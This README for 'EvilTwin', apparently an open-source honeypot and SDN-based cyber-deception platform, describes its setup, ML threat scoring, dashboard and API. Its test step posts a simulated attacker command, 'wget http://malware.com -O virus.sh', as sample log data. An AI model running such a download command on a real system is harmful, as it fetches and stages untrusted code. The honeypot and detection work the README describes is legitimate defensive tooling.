# EvilTwin — SDN-Powered Cyber Deception Platform

> Lure attackers into realistic honeypots. Redirect suspicious traffic with SDN.
> Score threats with ML. Monitor everything in a real-time SOC dashboard.

---

## Architecture Overview

```
                          ┌────────────────────────────┐
                          │   React Dashboard (:3000)  │
                          │   Live alerts · Maps · KPIs │
                          └─────────┬──────────────────┘
                                    │ WebSocket + REST
                          ┌─────────▼──────────────────┐
                          │   FastAPI Backend (:8000)   │
                          │   Ingest · Score · Alerts   │
                          ├────────────────────────────┤
                          │   AI Threat Scoring (RF)    │
                          │   VPN Detection             │
                          └──┬───────────┬─────────────┘
                             │           │
                   ┌─────────▼───┐  ┌────▼──────────┐
                   │ PostgreSQL  │  │  Splunk HEC    │
                   │  (events)   │  │  (forwarding)  │
                   └─────────────┘  └───────────────┘

        ┌──────────────────────────────────────────────┐
        │           SDN Layer (Ryu + OpenFlow)          │
        │  MAC learning · Threat redirect · Flow mgmt  │
        └──────────┬───────────────┬───────────────────┘
                   │               │
          ┌────────▼──────┐  ┌─────▼─────────┐
          │  Cowrie (SSH)  │  │ Dionaea (multi)│
          │  :2222 → :22   │  │ :21, :80, :445 │
          └───────────────┘  └───────────────┘
              deception-net (isolated)
```

## Getting Started & Comprehensive Tutorial

This tutorial will guide you through spinning up the full EvilTwin platform and exploring its features.

### 1. Environment Configuration

EvilTwin relies on several backend keys to power its external API checks and database.

First, clone the repository and set up your environment variables:

```bash
git clone https://github.com/your-org/eviltwin.git
cd eviltwin
cp .env.example .env
```

Open the `.env` file and set the `POSTGRES_PASSWORD` to a secure string. By default, the other services are pre-configured to communicate via internal Docker networks. 
*(Optional)* If you have IPInfo, AbuseIPDB, or Splunk tokens, you can add them here to enable advanced VPN detection and SIEM forwarding.

### 2. Training the AI Model

EvilTwin uses a Scikit-Learn Random Forest model to score session threats. If you do not have a pre-trained `model.pkl` in your `backend/ai/` folder, you must generate one.

The backend container will try to run this automatically, but doing it manually guarantees your model is fresh and allows you to view the accuracy and feature importance:

```bash
cd backend
pip install -r requirements.txt
python -m ai.train
cd ..
```

*This script synthesizes fake SSH and Web attacks to train the model, outputting the `model.pkl`.*

### 3. Running the Full Stack via Docker (Recommended)

You can spawn the entire platform—the frontend dashboard, backend API, Ryu SDN controller, PostgreSQL database, and Dionaea/Cowrie honeypots—using a single command. 

```bash
docker compose up -d --build
```

**What happens next?**

- `eviltwin-postgres` boots up on port 5432.
- `eviltwin-backend` launches on port 8000 and connects to the database. It begins trailing the honeypot logs via mapped volumes.
- `eviltwin-cowrie` (SSH) and `eviltwin-dionaea` (FTP/HTTP/SMB) boot silently on the isolated `deception-net`.
- `eviltwin-ryu` starts managing OpenFlow networking.
- `eviltwin-frontend` starts serving the React SOC console on port 3000.

### 4. Exploring the SOC Dashboard

Once Docker indicates the containers are healthy, open your browser:
👉 **[http://localhost:3000](http://localhost:3000)**

You are now looking at the **EvilTwin Live Threat Operations console**.

- **Dashboard:** Shows real-time aggregated metrics, geographical IP mappings, and the Live Threat Feed connected via WebSockets to the Backend API.
- **Sessions:** Drill down into specific attacker connections. Select an IP to view the terminal UI showing exactly what dangerous commands (like `wget` or `chmod`) they executed inside the honeypot.

### 5. Testing the Redirection & Honeypots

To generate some visual activity on your new dashboard, you can trigger a fake attack event:

1. Send a POST request directly to the log ingestion API acting as the Honeypot:
   
   ```bash
   curl -X POST http://localhost:8000/log \
     -H "Content-Type: application/json" \
     -d '{"eventid":"cowrie.command.input","src_ip":"8.8.8.8","message":"Downloading payload","input":"wget http://malware.com -O virus.sh", "session":"test01", "protocol":"ssh"}'
   ```
2. Check your Dashboard at **[http://localhost:3000](http://localhost:3000)**. You will immediately see the "Live Threat Feed" flash red, the Threat Level Gauge spike, and a new session appear in your Attack Maps.

### Alternative: Running the Frontend in Development Mode

If you only want to tinker with the React User Interface and aesthetic (without having to boot the heavy Python and Docker containers), you can launch the Vite dev server manually:

```bash
cd frontend
npm install
npm run dev
```

Navigate to **http://localhost:5173**. *Note: Because the backend is offline, the tables and graphs will display empty/null states, and the WebSocket indicator in the Top Bar will read "Disconnected".*

## 🎨 Showcase Mode (Dummy Data)

If you want to demonstrate the platform's UI without booting up the honeypots or generating real attacks, you can enable **Showcase Mode**. This automatically populates the Dashboard statistics, 3D Map arcs, and generates dynamic live threat feed alerts. 

To enable it for the frontend:

1. Navigate to the frontend directory: `cd frontend`
2. Run Vite with the showcase flag: `VITE_SHOWCASE_MODE=true npm run dev`
   *(Or add `VITE_SHOWCASE_MODE=true` to your `.env` file.)*

## Services

| Service            | Port      | Description                                 |
| ------------------ | --------- | ------------------------------------------- |
| `postgres`         | 5432      | PostgreSQL 16 — attacker data store         |
| `cowrie`           | 2222      | SSH honeypot (Cowrie)                       |
| `dionaea`          | 21/80/445 | Multi-protocol honeypot (Dionaea)           |
| `ryu`              | 6633/8080 | Ryu SDN controller + REST API               |
| `backend`          | 8000      | FastAPI — ingest, scoring, sessions, alerts |
| `frontend`         | 3000      | React SOC dashboard                         |
| `splunk-forwarder` | —         | Splunk Universal Forwarder                  |

## API Endpoints

| Method | Path              | Description                                |
| ------ | ----------------- | ------------------------------------------ |
| POST   | `/log`            | Ingest honeypot event (Cowrie JSON format) |
| GET    | `/score/{ip}`     | Get threat score for an IP                 |
| GET    | `/sessions`       | List sessions (paginated, filterable)      |
| GET    | `/sessions/{id}`  | Session detail with full command replay    |
| GET    | `/stats`          | Dashboard aggregations (24h)               |
| GET    | `/health`         | Service health check                       |
| WS     | `/ws/alerts`      | Real-time alert broadcast                  |
| POST   | `/webhook/canary` | Canary Token fire callback                 |

### Query Parameters for `/sessions`

- `page` / `page_size` — pagination (default: 1 / 25)
- `threat_level` — filter by level (0–4)
- `honeypot` — filter by type (`cowrie`, `dionaea`, `canary`)
- `date_from` / `date_to` — ISO datetime range
- `ip` — filter by attacker IP

## Running Tests

### Backend

```bash
cd backend
pip install -r requirements.txt
pytest tests/ -v
```

### Frontend

```bash
cd frontend
npm install
npm test
```

### AI Model Training

```bash
cd backend
python -m ai.train
# Outputs model.pkl + classification report + feature importances
```

## Security Notes

- Honeypots run on an **isolated Docker network** (`deception-net`, `internal: true`)
- Honeypots **cannot reach** the internet or database directly
- Backend reads logs via **volume mounts** (one-way)
- All attacker data stored as **JSONB** — never interpolated into queries
- API keys loaded from **environment only** — never hardcoded or logged
- Canary webhook validates **HMAC-SHA256** signature before processing
- Dashboard auth is fully implemented using PostgreSQL-backed JWT tokens. Use the `/auth/register` API endpoint to create an initial admin account to access the dashboard.

## Technology Stack

Python 3.11 · FastAPI · SQLAlchemy 2 · PostgreSQL 16 · Scikit-learn ·
Ryu Framework · Open vSwitch · React 18 · TypeScript · Tailwind CSS v3 ·
Recharts · Zustand · Docker Compose · Terraform · Splunk
